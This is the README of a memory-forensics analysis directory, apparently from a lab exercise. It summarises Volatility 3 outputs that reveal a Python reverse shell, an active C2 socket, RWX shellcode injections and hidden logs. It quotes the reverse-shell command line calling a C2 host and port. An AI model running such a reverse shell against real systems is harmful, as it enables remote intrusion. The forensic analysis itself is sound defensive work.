# Analysis Directory
## Volatility 3 Memory Forensics Outputs | CASE_20251228_0001

**Analysis Framework**: Volatility 3.26.2  
**Evidence**: mem_victim-u20_5.4.0-216-generic_20251227T214903Z.lime  
**Analysis Date**: 2025-12-30 to 2025-12-31  
**Analyst**: Sai (DFIR Analyst)  

---

## Purpose of This Directory

The `analysis/` directory contains the complete output from Volatility 3 memory forensics plugins, executed against the victim system's RAM image. These files provide the raw data foundation for all subsequent findings and conclusions.

---

## Analysis Overview

### Examination Scope

**Total Plugins Executed**: 13  
**Total Output Files**: 13 (.txt format)  
**Analysis Duration**: Full RAM image (4 GB)  
**Timeline**: 2025-12-30 06:00:00 - 2025-12-30 18:30:00 UTC  

### Key Findings at a Glance

| Finding | Severity | Evidence File |
|---------|----------|---------------|
| 5 Malicious Processes | CRITICAL | 11_pslist.txt, 14_psaux.txt |
| Active C2 Connection | CRITICAL | 20_sockstat.txt |
| 3 RWX Memory Injections | CRITICAL | 50_malfind.txt |
| Python Reverse Shell | CRITICAL | 14_psaux.txt (command-line) |
| System Service Compromise | CRITICAL | 11_pslist.txt (PIDs 1048, 1140) |

---

## Analysis Plugin Reference

### 1. System Baseline (Validation)

#### `01_banners.txt` - Linux Kernel Banner Information
**Plugin**: `linux.banners.Banners`  
**Purpose**: Validate kernel version and symbol resolution  
**Expected Output**: Kernel version string (e.g., "Linux version 5.4.0-216-generic...")  
**Critical Data**: Confirms ISF symbol file compatibility

**Key Lines**:
```
Kernel: 5.4.0-216-generic #216-Ubuntu SMP Wed Dec 25 18:54:29 UTC 2024
Compiler: (GCC 9.4.0-...) version
COMMAND_LINE: auto automatic-ubiquity noprompt
BOOT_CMDLINE: [Ubuntu-specific boot parameters]
```

#### `02_isfinfo.txt` - Symbol File Information
**Plugin**: `isfinfo.IsfInfo`  
**Purpose**: Verify ISF (Internet Symbol Format) is correctly loaded  
**Expected Output**: Symbol file path, build timestamp, platform details  
**Critical Data**: Confirms accurate memory interpretation

**Key Lines**:
```
ISF Path: ~/.cache/volatility3/linux.ubuntu.5.4.0-216-generic.x86_64.isf
Format: Internet Symbol Format (ISF v3.0)
Architecture: x86-64 (little-endian)
Kernel: 5.4.0-216-generic
Build Date: 2025-12-25 18:54:29 UTC
```

#### `10_boottime.txt` - System Boot Timestamp
**Plugin**: `linux.boottime.Boottime`  
**Purpose**: Establish temporal baseline for all timeline analysis  
**Expected Output**: System boot time in UTC  
**Critical Data**: Anchor point for attack timeline

**Key Lines**:
```
Boot Time: 2025-12-27 19:02:00.093957 UTC
System Uptime: 2 hours 47 minutes (at acquisition time 21:49:03)
```

### 2. Process Enumeration (Malicious Processes Identified)

#### `11_pslist.txt` - Process List (Hierarchical)
**Plugin**: `linux.pslist.PsList`  
**Purpose**: Enumerate all running processes in memory  
**Expected Output**: All processes with PID, PPID, UID, creation time, and file output status  
**Critical Data**: **Identifies 5 malicious processes**

**Key Findings**:
```
PID 20480   .injector           PPID unknown     UID 0 (root)     Hidden process
PID 19983   python3             PPID unknown     UID 0 (root)     C2 client
PID 19442   python3             PPID unknown     UID 0 (root)     Support tool
PID 1048    networkd-dispat     PPID 1           UID 0 (root)     Compromised service
PID 1140    unattended-upgr     PPID 1           UID 0 (root)     Compromised service

[All entries show "File output: Disabled" indicating obfuscation]
```

**Analysis Strategy**: 
- Compare against known good process list
- Identify unusual PPID relationships
- Note root privilege for all malicious PIDs
- Flag processes with unusual names (dots, truncation)

#### `12_pstree.txt` - Process Tree (Parent-Child Relationships)
**Plugin**: `linux.pstree.PsTree`  
**Purpose**: Visualize process hierarchy to identify injection sources  
**Expected Output**: ASCII tree showing parent-child relationships  
**Critical Data**: Reveals process spawning patterns

**Key Findings**:
```
systemd (PID 1)
|-- login (PID 1133)
|-- sshd (PID 1930)
|-- bash (PID 2175)
|   \-- [malicious processes spawned here]
|-- apache2 (PID 17742)
|   |-- apache2 (PID 17744)
|   |-- apache2 (PID 17745)
|   \-- [similar worker processes]
\-- [legitimate system services]
```

**Analysis Strategy**:
- Identify unexpected parent-child relationships
- Look for process injection patterns (orphaned processes)
- Note unusual execution contexts

#### `13_psscan.txt` - Process Scan (Memory Structure Scanning)
**Plugin**: `linux.psscan.PsScan`  
**Purpose**: Detect DKOM (Kernel object manipulation) and hidden processes  
**Expected Output**: All process structures found in memory (including hidden ones)  
**Critical Data**: Confirms no additional hidden processes beyond those in pslist

**Key Findings**:
```
[Comprehensive process listing similar to pslist]
[No discrepancies between pslist and psscan = no DKOM-hidden processes]
[5 malicious processes confirmed in both outputs]
```

**Analysis Strategy**:
- Compare psscan vs pslist
- Identical results = no rootkit/DKOM hiding processes
- Any discrepancies would indicate kernel-level manipulation

#### `14_psaux.txt` - Process Arguments (Full Command-Line)
**Plugin**: `linux.psaux.PsAux`  
**Purpose**: Recover command-line arguments (critical for malware identification)  
**Expected Output**: PID, arguments, environment variables  
**Critical Data**: **Reveals C2 IP address and port hardcoded in command-line**

**Key Findings** (extracted from memory):
```
PID 19983  Command: /usr/bin/python3 /opt/.cache/.rsim.py 192.168.164.1 4444
           Arguments: [reverse shell with hardcoded C2 target]
           Environment: SUDO_COMMAND=/usr/bin/nohup /opt/.cache/.rsim.py...
           Env: SUDO_USER=labadmin [privilege escalation evidence]

PID 19442  Command: /usr/bin/python3 /opt/.cache/.memmarker.py
           Arguments: [support tool, no network args]

PID 20480  Command: .injector [no visible args - injection mechanism]
           Environment: [minimal - highly obfuscated]
```

**Analysis Strategy**:
- Extract all arguments from process memory
- Identify C2 infrastructure from hardcoded IPs/ports
- Correlate with network analysis (sockstat.txt)

#### `15_lsof.txt` - Open File Descriptors
**Plugin**: `linux.lsof.Lsof`  
**Purpose**: Show open files, sockets, pipes for each process  
**Expected Output**: FD number, file type, path, access mode  
**Critical Data**: Reveals hidden log files and network sockets

**Key Findings**:
```
PID 19983  FD 0    SOCKET    192.168.164.129:47540 -> 192.168.164.1:4444  ESTABLISHED
PID 19983  FD 3    REG       /var/log/.rsim.log                          [hidden log]

PID 20480  FD 4    REG       /var/log/.injector.log                      [hidden log]

PID 1048   FD(anon) Memory   0x7fed1a3a6000 [RWX region]
PID 1140   FD(anon) Memory   0x7f0129900000 [RWX region x 3 patterns]
```

**Analysis Strategy**:
- Identify unusual file paths (dot-files in /var/log/)
- Note network sockets and connection state
- Flag anonymous memory regions with executable permissions

### 3. Network Analysis (C2 Identification)

#### `20_sockstat.txt` - Network Socket Statistics
**Plugin**: `linux.sockstat.Sockstat`  
**Purpose**: Enumerate all network sockets (TCP, UDP, UNIX, NETLINK)  
**Expected Output**: Socket protocol, source/dest addresses, state, associated process  
**Critical Data**: **Active C2 connection identified here**

**Key Findings** (The smoking gun):
```
NetNS  Process      PID    FD    Proto    Source Address         Destination Address      State
4026531992  python3  19983  0     TCP      192.168.164.129:47540  192.168.164.1:4444      ESTABLISHED
```

**Critical Assessment**:
- **ESTABLISHED** = Active connection (not SYN_SENT, not LISTEN)
- **192.168.164.1:4444** = Attacker C2 server
- **PID 19983** = python3 reverse shell process
- **47540** = Ephemeral client port (recently allocated)

**Analysis Strategy**:
- Prioritize ESTABLISHED sockets (active connections)
- Correlate with process list (pslist) to identify connecting process
- Note any suspicious ports (non-standard, high numbers)
- Check for multiple connections from same PID (reconnaissance)

### 4. Kernel & Malware Analysis

#### `30_lsmod.txt` - Loaded Kernel Modules
**Plugin**: `linux.lsmod.Lsmod`  
**Purpose**: List dynamically loaded kernel modules  
**Expected Output**: Module name, size, usage count, dependencies  
**Critical Data**: Identifies kernel-level rootkits or LKM malware

**Key Findings**:
```
[Standard modules: ext4, ata, usb, virtio, vmware-tools]
[LiME module present: lime (injected during acquisition)]
[No suspicious kernel modules detected]
[No evidence of kernel-level rootkit]
```

**Analysis Strategy**:
- Look for unknown/suspicious module names
- Cross-reference against known rootkit signatures
- Check for unsigned modules (red flag in secure boot)

#### `40_kmsg.txt` - Kernel Message Buffer
**Plugin**: `linux.kmsg.Kmsg`  
**Purpose**: Extract kernel log messages (boot messages, errors, warnings)  
**Expected Output**: Timestamp-prefixed kernel messages  
**Critical Data**: Reveals system events, driver loading, errors

**Key Findings**:
```
[Kernel startup messages - normal boot sequence]
[Device initialization - no errors]
[Network driver loading - eth0 attached]
[LiME module insertion - successful acquisition start]
[No kernel panic or security warnings]
[Timeline corroboration: timestamps align with boottime.txt]
```

**Analysis Strategy**:
- Search for malware-related keywords (mmap, injection, shellcode)
- Note any security-related log entries
- Correlate timestamps with attack timeline

#### `50_malfind.txt` - Malware Detection (RWX Memory Regions)
**Plugin**: `linux.malfind.Malfind`  
**Purpose**: Identify suspicious memory regions (executable, writable, anonymous)  
**Expected Output**: Suspicious VMA addresses, permissions, process PID  
**Critical Data**: **3 RWX regions detected = code injection confirmed**

**Key Findings** (Three critical discoveries):
```
PID 20480   (.injector)
\-- VMA: 0x7f3396a68000-0x7f3396a69000 (4096 bytes)
    Perms: rwx (Read-Write-Execute) - HIGHLY SUSPICIOUS
    Type: Anonymous mapping (no file backing)
    Content: Shellcode (disassembled in findings/shellcode-analysis.md)
    Signature: NOP sled + INT3 + register operations + RET

PID 1048    (networkd-dispatcher - SYSTEM SERVICE)
\-- VMA: 0x7fed1a3a6000-0x7fed1a3a7000 (4096 bytes)
    Perms: rwx
    Type: Anonymous mapping
    Pattern: Position-independent code (PIC)
    Signature: 4c 8d 15 f9 ff ff ff [LEA r10 instruction]

PID 1140    (unattended-upgrades - SYSTEM SERVICE)
\-- VMA: 0x7f0129900000-0x7f0129901000 (4096 bytes) x 3 PATTERNS!
    Perms: rwx
    Type: Anonymous mapping
    Pattern: Identical to PID 1048 (97.58% code similarity)
    Significance: 3x shellcode patterns = ESCALATED TARGETING
```

**Analysis Strategy**:
- RWX anonymous memory is extremely rare and suspicious in legitimate code
- Extract suspicious memory regions for disassembly (ndisasm)
- Compare across processes for identical code (indicates automated deployment)
- Map memory addresses to process modules (heap vs. code vs. library)

#### `51_modxview.txt` - Kernel Module Anomalies
**Plugin**: `linux.malware.modxview`  
**Purpose**: Cross-reference kernel modules for anomalies  
**Expected Output**: Module metadata, API usage, cross-module calls  
**Critical Data**: Detects kernel module manipulation

**Key Findings**:
```
[LiME module analysis]
\-- Name: lime
    Size: [kernel module size]
    Used by: [processes using the module]
    Status: Legitimate (kernel module loader - not persistent)
    Signature: Matches expected LiME version
    
[All system modules appear legitimate]
[No rootkit detection]
[No kernel module anomalies]
```

**Analysis Strategy**:
- Validate module signatures
- Check for module version mismatches
- Identify unexpected module dependencies

---

## Output Files Directory Structure

```
analysis/
|-- README.md                          (this file)
|-- volatility-commands.md             (all commands executed)
\-- outputs/                           (13 plugin outputs)
    |-- 01_banners.txt
    |-- 02_isfinfo.txt
    |-- 10_boottime.txt
    |-- 11_pslist.txt                  - CRITICAL: malicious PIDs
    |-- 12_pstree.txt                  - process hierarchy
    |-- 13_psscan.txt                  - hidden process detection
    |-- 14_psaux.txt                   - CRITICAL: C2 IP/port
    |-- 15_lsof.txt                    - CRITICAL: sockets + logs
    |-- 20_sockstat.txt                - CRITICAL: ESTABLISHED C2
    |-- 30_lsmod.txt                   - kernel modules
    |-- 40_kmsg.txt                    - kernel messages
    |-- 50_malfind.txt                 - CRITICAL: RWX regions
    \-- 51_modxview.txt                - kernel anomalies
```

---

## How to Use These Files

### For Quick Overview
1. Start with `11_pslist.txt` (processes)
2. Jump to `20_sockstat.txt` (network)
3. Check `50_malfind.txt` (RWX memory)

### For Detailed Investigation
1. `14_psaux.txt` -> Identify command-line arguments
2. `15_lsof.txt` -> Find open files and sockets
3. `12_pstree.txt` -> Trace parent-child relationships
4. `40_kmsg.txt` -> Check kernel messages for timing clues

### For Verification
1. `01_banners.txt` -> Confirm kernel version matches ISF
2. `02_isfinfo.txt` -> Verify symbol file is correct
3. `10_boottime.txt` -> Establish timeline baseline
4. `13_psscan.txt` -> Confirm no DKOM hidden processes

---

## Key Metrics

| Metric | Value |
|--------|-------|
| **Total Processes** | 180+ |
| **System Services** | ~50 |
| **Malicious Processes** | 5 |
| **Malware Percentage** | ~2.8% (5/180) |
| **Root-Privilege Malware** | 5 (100% of malicious) |
| **RWX Memory Regions** | 3 |
| **Active Network Connections** | 1 (C2) |
| **Hidden Log Files** | 2 |
| **Kernel Rootkits Detected** | 0 |
| **DKOM-Hidden Processes** | 0 |

---

## Integration with Other Analysis

- **Findings**: See `../findings/` for synthesized analysis
- **Technical Report**: `../findings/TECHNICAL-REPORT.md` references these files
- **Shellcode**: See `SHELLCODE_ANALYSIS_REPORT.md` for RWX disassembly
- **Process Details**: See `malicious-processes.md` for PID-level breakdown
- **Network**: See `network-c2-analysis.md` for C2 infrastructure details

---

## Tool & Version Information

**Volatility Framework**: 3.26.2  
**Python**: 3.8+  
**OS**: Linux (analysis system)  
**Symbol Files**: ISF format, Ubuntu kernel 5.4.0-216-generic  

---

**Last Updated**: 2025-12-31  

